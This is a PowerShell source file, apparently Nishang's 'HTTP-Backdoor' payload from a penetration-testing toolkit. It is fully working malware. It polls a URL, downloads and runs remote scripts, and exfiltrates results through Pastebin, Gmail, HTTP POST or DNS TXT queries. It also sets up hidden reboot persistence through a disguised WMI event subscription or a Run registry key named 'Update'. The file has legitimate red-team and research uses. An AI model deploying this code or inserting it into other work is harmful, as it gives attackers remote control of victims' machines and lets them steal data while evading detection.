
function HTTP-Backdoor
{
<#
.SYNOPSIS
Nishang Payload which queries a URL for instructions and then downloads and executes a powershell script.

.DESCRIPTION
This payload queries the given URL and after a suitable command (given by MagicString variable) is found, 
it downloads and executes a powershell script. The payload could be stopped remotely if the string at CheckURL matches
the string given in StopString variable.
If using DNS or Webserver ExfilOption, use Invoke-Decode.ps1 in the Utility folder to decode.

.PARAMETER CheckURL
The URL which the payload would query for instructions.

.PARAMETER PayloadURL
The URL from where the powershell script would be downloaded.

.PARAMETER Arguments
Arguments to be passed to a script. Powerpreter and other scripts in Nishang need the function name and arguments here.

.PARAMETER MagicString
The string which would act as an instruction to the payload to proceed with download and execute.

.PARAMETER StopString
The string which if found at CheckURL will stop the payload.

.PARAMETER persist
Use this parameter to achieve reboot persistence. Different methods of persistence with Admin access and normal user access.

.PARAMETER exfil
Use this parameter to use exfiltration methods for returning the results.

.PARAMETER ExfilOption
The method you want to use for exfitration of data. Valid options are "gmail","pastebin","WebServer" and "DNS".

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for other options

.PARAMETER username
Username for the pastebin/gmail account where data would be exfiltrated.
Unused for other options

.PARAMETER password
Password for the pastebin/gmail account where data would be exfiltrated.
Unused for other options

.PARAMETER URL
The URL of the webserver where POST requests would be sent. The Webserver must beb able to log the POST requests.
The encoded values from the webserver could be decoded bby using Invoke-Decode from Nishang.

.PARAMETER DomainName
The DomainName, whose subdomains would be used for sending TXT queries to. The DNS Server must log the TXT queries.

.PARAMETER AuthNS
Authoritative Name Server for the domain specified in DomainName. Using it may increase chances of detection.
Usually, you should let the Name Server of target to resolve things for you.

.Example

PS > HTTP-Backdoor

The payload will ask for all required options.

.EXAMPLE
PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -MagicString start123 -StopString stopthis

Use above when using the payload from non-interactive shells. The Arguments parameter passes the arguments to the downloaded payload script or module. 

.EXAMPLE
PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -MagicString start123 -StopString stopthis

Use above when using the payload from non-interactive shells and no argument needs to be passed to the downloaded script. 

.EXAMPLE
PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -MagicString start123 -StopString stopthis -exfil -ExfilOption DNS -DomainName example.com -AuthNS <dns>

Use above command for using exfiltration methods.


.EXAMPLE
PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -MagicString start123 -StopString stopthis -persist

Use above for reboot persistence.

.EXAMPLE
PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -MagicString start123 -StopString stopthis -ExfilOption WebServer http://resultwebserver -persist

Use above command for using exfiltration methods and reboot persistence.



.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang
#>
    
    [CmdletBinding(DefaultParameterSetName="noexfil")] Param(
        [Parameter(Parametersetname="exfil")]
        [Switch]
        $persist,

        [Parameter(Parametersetname="exfil")]
        [Switch]
        $exfil,

        [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $CheckURL,

        [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $PayloadURL,

        [Parameter(Position = 2, Mandatory = $False, Parametersetname="exfil")]
        [Parameter(Position = 2, Mandatory = $False, Parametersetname="noexfil")]
        [String]
        $Arguments = "Out-Null",

        [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $MagicString,

        [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 4, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $StopString,


        [Parameter(Position = 5, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
        [String]
        $ExfilOption,

        [Parameter(Position = 6, Mandatory = $False, Parametersetname="exfil")] 
        [String]
        $dev_key = "null",

        [Parameter(Position = 7, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $username = "null",

        [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $password = "null",

        [Parameter(Position = 9, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $URL = "null",
      
        [Parameter(Position = 10, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $DomainName = "null",

        [Parameter(Position = 11, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $AuthNS = "null"   
   
   )


    $body = @'
function HTTP-Backdoor-Logic ($CheckURL, $PayloadURL, $Arguments, $MagicString, $StopString, $ExfilOption, $dev_key, $username, $password, $URL, $DomainName, $AuthNS, $exfil) 
{
    while($true)
    {
    $exec = 0
    start-sleep -seconds 5
    $webclient = New-Object System.Net.WebClient
    $filecontent = $webclient.DownloadString("$CheckURL")
    $filecontent = $filecontent.TrimEnd()
    if($filecontent -eq $MagicString)
    {
       
        $script:pastevalue = Invoke-Expression $webclient.DownloadString($PayloadURL)
        # Check for arguments to the downloaded script.
        if ($Arguments -ne "Out-Null")
        {
            $pastevalue = Invoke-Expression $Arguments                   
        }
        $pastevalue
        $exec++
        if ($exfil -eq $True)
        {
           $pastename = $env:COMPUTERNAME + " Results of HTTP Backdoor: "
           Do-Exfiltration-HTTP "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$AuthNS"
        }
        if ($exec -eq 1)
        {
            Start-Sleep -Seconds 60
        }
    }
    elseif ($filecontent -eq $StopString)
    {
        break
    }
    }
}
'@


$exfiltration = @'
function Do-Exfiltration-HTTP($pastename,$pastevalue,$ExfilOption,$dev_key,$username,$password,$URL,$DomainName,$ExfilNS)
{
    function post_http($url,$parameters) 
    { 
        $http_request = New-Object -ComObject Msxml2.XMLHTTP 
        $http_request.open("POST", $url, $false) 
        $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
        $http_request.setRequestHeader("Content-length", $parameters.length); 
        $http_request.setRequestHeader("Connection", "close") 
        $http_request.send($parameters) 
        $script:session_key=$http_request.responseText 
    } 
    function Compress-Encode
    {
        #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
        $ms = New-Object IO.MemoryStream
        $action = [IO.Compression.CompressionMode]::Compress
        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
        $pastevalue | ForEach-Object {$sw.WriteLine($_)}
        $sw.Close()
        # Base64 encode stream
        $code = [Convert]::ToBase64String($ms.ToArray())
        return $code
    }

    if ($exfiloption -eq "pastebin")
    {
        $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($Data)
        $pastevalue = [System.Convert]::ToBase64String($utfbytes)
        post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
        post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pastename&api_paste_code=$pastevalue&api_paste_private=2" 
    }
        
    elseif ($exfiloption -eq "gmail")
    {
        #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
        $smtpserver = "smtp.gmail.com"
        $msg = new-object Net.Mail.MailMessage
        $smtp = new-object Net.Mail.SmtpClient($smtpServer )
        $smtp.EnableSsl = $True
        $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
        $msg.From = "$username@gmail.com"
        $msg.To.Add("$username@gmail.com")
        $msg.Subject = $pastename
        $msg.Body = $pastevalue
        if ($filename)
        {
            $att = new-object Net.Mail.Attachment($filename)
            $msg.Attachments.Add($att)
        }
        $smtp.Send($msg)
    }

    elseif ($exfiloption -eq "webserver")
    {
        $Data = Compress-Encode
        post_http $URL $Data
    }
    elseif ($ExfilOption -eq "DNS")
    {
        $code = Compress-Encode
        $lengthofsubstr = 0
        $queries = [int]($code.Length/63)
        while ($queries -ne 0)
        {
            $querystring = $code.Substring($lengthofsubstr,63)
            Invoke-Expression "nslookup -querytype=txt $querystring.$DomaName $AuthNS"
            $lengthofsubstr += 63
            $queries -= 1
        }
        $mod = $code.Length%63
        $query = $code.Substring($code.Length - $mod, $mod)
        Invoke-Expression "nslookup -querytype=txt $query.$DomainName $AuthNS"

    }
}
'@
    $modulename = "HTTP-Backdoor.ps1"
    if($persist -eq $True)
    {
        $name = "persist.vbs"
        $options = "HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString"
        if ($exfil -eq $True)
        {
            $options = "HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil"
        }
        Out-File -InputObject $body -Force $env:TEMP\$modulename
        Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
        Out-File -InputObject $options -Append $env:TEMP\$modulename
        echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
        echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
        if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true)
        {
            $scriptpath = $env:TEMP
            $scriptFileName = "$scriptpath\$name"
            $filterNS = "root\cimv2"
            $wmiNS = "root\subscription"
            $query = @"
             Select * from __InstanceCreationEvent within 30 
             where targetInstance isa 'Win32_LogonSession' 
"@
            $filterName = "WindowsSanity"
            $filterPath = Set-WmiInstance -Class __EventFilter -Namespace $wmiNS -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}
            $consumerPath = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace $wmiNS -Arguments @{name="WindowsSanity"; ScriptFileName=$scriptFileName; ScriptingEngine="VBScript"}
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace $wmiNS -arguments @{Filter=$filterPath; Consumer=$consumerPath} |  out-null
        }
        else
        {
            New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:TEMP\$name -force
            echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
            echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
        }
    }
    else
    {
        $options = "HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString"
        if ($exfil -eq $True)
        {
            $options = "HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil"
        }
        Out-File -InputObject $body -Force $env:TEMP\$modulename
        Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
        Out-File -InputObject $options -Append $env:TEMP\$modulename
        Invoke-Expression $env:TEMP\$modulename
    }
}



